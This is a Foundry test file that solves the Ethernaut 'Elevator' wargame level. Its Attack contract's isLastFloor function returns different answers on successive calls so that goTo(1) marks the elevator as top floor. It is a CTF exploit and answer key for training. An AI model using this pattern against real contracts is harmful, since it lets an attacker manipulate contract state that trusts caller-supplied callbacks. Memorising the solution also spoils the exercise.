// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";

contract ElevatorTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack(address(ethernautElevator));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    address target;
    bool boo = false;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Elevator elevator = Elevator(target);
        elevator.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!boo) {
            boo = true;
            return false;
        }
        return true;
    }
}
